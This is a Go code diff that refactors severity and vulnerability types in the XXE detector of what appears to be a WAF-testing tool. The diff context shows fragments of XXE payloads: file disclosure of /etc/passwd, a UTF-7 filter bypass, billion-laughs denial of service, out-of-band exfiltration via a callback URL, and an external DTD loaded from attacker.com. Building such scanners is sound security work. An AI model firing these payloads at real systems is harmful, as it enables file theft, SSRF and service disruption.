@@ -14,6 +14,7 @@ import (
 
 	"github.com/waftester/waftester/pkg/defaults"
 	"github.com/waftester/waftester/pkg/duration"
+	"github.com/waftester/waftester/pkg/finding"
 	"github.com/waftester/waftester/pkg/httpclient"
 	"github.com/waftester/waftester/pkg/iohelper"
 )
@@ -30,40 +31,23 @@ const (
 	AttackDTDInclusion    AttackType = "dtd_inclusion"    // External DTD inclusion
 )
 
-// Severity represents the severity of a finding
-type Severity string
-
-const (
-	SeverityCritical Severity = "critical"
-	SeverityHigh     Severity = "high"
-	SeverityMedium   Severity = "medium"
-	SeverityLow      Severity = "low"
-	SeverityInfo     Severity = "info"
-)
-
 // Payload represents an XXE payload
 type Payload struct {
-	Name         string         // Payload name
-	Type         AttackType     // Attack type
-	XML          string         // The XML payload
-	Description  string         // Description of the attack
-	Severity     Severity       // Severity if successful
-	Indicators   []string       // Strings to look for in response
-	Regex        *regexp.Regexp // Regex pattern to match
-	ExpectedFile string         // File being read (for file disclosure)
+	Name         string           // Payload name
+	Type         AttackType       // Attack type
+	XML          string           // The XML payload
+	Description  string           // Description of the attack
+	Severity     finding.Severity // Severity if successful
+	Indicators   []string         // Strings to look for in response
+	Regex        *regexp.Regexp   // Regex pattern to match
+	ExpectedFile string           // File being read (for file disclosure)
 }
 
 // Vulnerability represents a detected XXE vulnerability
 type Vulnerability struct {
-	Type         AttackType    `json:"type"`
-	Description  string        `json:"description"`
-	Severity     Severity      `json:"severity"`
-	Payload      *Payload      `json:"payload"`
-	Evidence     string        `json:"evidence"`
-	URL          string        `json:"url"`
-	ResponseTime time.Duration `json:"response_time"`
-	Remediation  string        `json:"remediation"`
-	ConfirmedBy  int           `json:"confirmed_by,omitempty"`
+	finding.Vulnerability
+	Type    AttackType `json:"type"`
+	Payload *Payload   `json:"payload,omitempty"`
 }
 
 // DetectorConfig configures the XXE detector
@@ -182,7 +166,7 @@ func (d *Detector) fileDisclosurePayloads() []*Payload {
 ]>
 <root>&xxe;</root>`, file.path),
 			Description:  fmt.Sprintf("Attempt to read %s via XXE", file.path),
-			Severity:     SeverityCritical,
+			Severity:     finding.Critical,
 			Indicators:   file.patterns,
 			ExpectedFile: file.path,
 		})
@@ -197,7 +181,7 @@ func (d *Detector) fileDisclosurePayloads() []*Payload {
 ]>
 <root>&xxe;</root>`, file.path),
 			Description:  fmt.Sprintf("Attempt to read %s via PHP filter wrapper", file.path),
-			Severity:     SeverityCritical,
+			Severity:     finding.Critical,
 			Regex:        regexp.MustCompile(`^[A-Za-z0-9+/=]{20,}`),
 			ExpectedFile: file.path,
 		})
@@ -213,7 +197,7 @@ func (d *Detector) fileDisclosurePayloads() []*Payload {
 +AF0-+AD4-
 +ADw-root+AD4-+ACY-xxe+ADsAPA-/root+AD4-`,
 		Description:  "XXE with UTF-7 encoding to bypass filters",
-		Severity:     SeverityCritical,
+		Severity:     finding.Critical,
 		Indicators:   []string{"root:", "daemon:"},
 		ExpectedFile: "/etc/passwd",
 	})
@@ -228,7 +212,7 @@ func (d *Detector) fileDisclosurePayloads() []*Payload {
 ]>
 <root attr="&xxe;"/>`,
 		Description:  "XXE entity referenced in attribute",
-		Severity:     SeverityCritical,
+		Severity:     finding.Critical,
 		Indicators:   []string{"root:", "daemon:"},
 		ExpectedFile: "/etc/passwd",
 	})
@@ -259,7 +243,7 @@ func (d *Detector) ssrfPayloads() []*Payload {
 ]>
 <root>&xxe;</root>`, target),
 			Description: fmt.Sprintf("SSRF via XXE to %s", target),
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 			Indicators:  []string{"ami-", "instance", "metadata", "compute"},
 		})
 	}
@@ -282,7 +266,7 @@ func (d *Detector) dosPayloads() []*Payload {
 ]>
 <lolz>&lol4;</lolz>`,
 			Description: "Small billion laughs attack to test entity expansion limits",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 
 		// Quadratic Blowup
@@ -295,7 +279,7 @@ func (d *Detector) dosPayloads() []*Payload {
 ]>
 <kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>`,
 			Description: "Quadratic blowup attack via large entity repetition",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 
 		// External entity file DoS
@@ -308,7 +292,7 @@ func (d *Detector) dosPayloads() []*Payload {
 ]>
 <foo>&xxe;</foo>`,
 			Description: "DoS via reading from /dev/random",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 	}
 }
@@ -327,7 +311,7 @@ func (d *Detector) oobPayloads() []*Payload {
 ]>
 <root>&xxe;</root>`, callbackURL),
 			Description: "Out-of-band XXE via HTTP callback",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 
 		// OOB with parameter entity
@@ -341,7 +325,7 @@ func (d *Detector) oobPayloads() []*Payload {
 ]>
 <root>test</root>`, callbackURL),
 			Description: "Out-of-band XXE via external DTD",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 
 		// OOB data exfiltration
@@ -357,7 +341,7 @@ func (d *Detector) oobPayloads() []*Payload {
 ]>
 <root>test</root>`, callbackURL),
 			Description: "Blind XXE with data exfiltration via OOB channel",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 
 		// FTP OOB (uses callback URL)
@@ -372,7 +356,7 @@ func (d *Detector) oobPayloads() []*Payload {
 ]>
 <root>test</root>`, callbackURL),
 			Description: "Out-of-band XXE via external DTD for FTP",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 	}
 }
@@ -389,7 +373,7 @@ func (d *Detector) parameterEntityPayloads() []*Payload {
 ]>
 <root>test</root>`,
 			Description: "File read via parameter entity",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 			Indicators:  []string{"root:", "daemon:"},
 		},
 
@@ -405,7 +389,7 @@ func (d *Detector) parameterEntityPayloads() []*Payload {
 ]>
 <root>&all;</root>`,
 			Description: "Parameter entity with CDATA wrapper",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 	}
 }
@@ -419,7 +403,7 @@ func (d *Detector) dtdInclusionPayloads() []*Payload {
 <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
 <root>test</root>`,
 			Description: "External DTD inclusion via HTTP",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 		},
 
 		{
@@ -429,7 +413,7 @@ func (d *Detector) dtdInclusionPayloads() []*Payload {
 <!DOCTYPE foo SYSTEM "file:///etc/passwd">
 <root>test</root>`,
 			Description: "External DTD inclusion via file://",
-			Severity:    SeverityHigh,
+			Severity:    finding.High,
 			Indicators:  []string{"root:", "daemon:"},
 		},
 
@@ -445,7 +429,7 @@ func (d *Detector) dtdInclusionPayloads() []*Payload {
 ]>
 <root>test</root>`,
 			Description: "Chained external DTD with parameter entities",
-			Severity:    SeverityCritical,
+			Severity:    finding.Critical,
 		},
 	}
 }
@@ -575,14 +559,16 @@ func (d *Detector) analyzeResponse(targetURL string, payload *Payload, body stri
 	}
 
 	return &Vulnerability{
-		Type:         payload.Type,
-		Description:  payload.Description,
-		Severity:     payload.Severity,
-		Payload:      payload,
-		Evidence:     evidence,
-		URL:          targetURL,
-		ResponseTime: elapsed,
-		Remediation:  getRemediation(payload.Type),
+		Vulnerability: finding.Vulnerability{
+			Description:  payload.Description,
+			Severity:     payload.Severity,
+			Evidence:     evidence,
+			URL:          targetURL,
+			ResponseTime: elapsed,
+			Remediation:  getRemediation(payload.Type),
+		},
+		Type:    payload.Type,
+		Payload: payload,
 	}
 }
 
